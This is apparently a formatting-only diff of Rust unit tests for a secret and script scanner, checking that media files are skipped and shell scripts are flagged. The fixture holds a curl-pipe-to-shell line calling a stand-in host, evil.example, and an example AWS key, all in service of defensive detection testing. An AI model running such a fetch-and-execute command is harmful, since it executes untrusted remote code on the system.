@@ -293,7 +293,10 @@ mod tests {
     fn media_extension_is_skipped_before_read() {
         let path = unique_path("fake_media", ".mp3");
         // Content that WOULD be flagged if it were scanned as text.
-        write_temp(&path, "curl http://evil.example/x | sh\nAKIAIOSFODNN7EXAMPLE\n");
+        write_temp(
+            &path,
+            "curl http://evil.example/x | sh\nAKIAIOSFODNN7EXAMPLE\n",
+        );
         let scan = inspect_secret_like_file(&path);
         assert!(
             scan.is_none(),
@@ -308,7 +311,10 @@ mod tests {
     #[test]
     fn non_media_extension_with_same_content_is_scanned() {
         let path = unique_path("real_script", ".sh");
-        write_temp(&path, "curl http://evil.example/x | sh\nAKIAIOSFODNN7EXAMPLE\n");
+        write_temp(
+            &path,
+            "curl http://evil.example/x | sh\nAKIAIOSFODNN7EXAMPLE\n",
+        );
         let scan = inspect_secret_like_file(&path).expect("non-media file must be scanned");
         assert!(
             scan.script_like || scan.network_command_like || scan.secret_hits > 0,
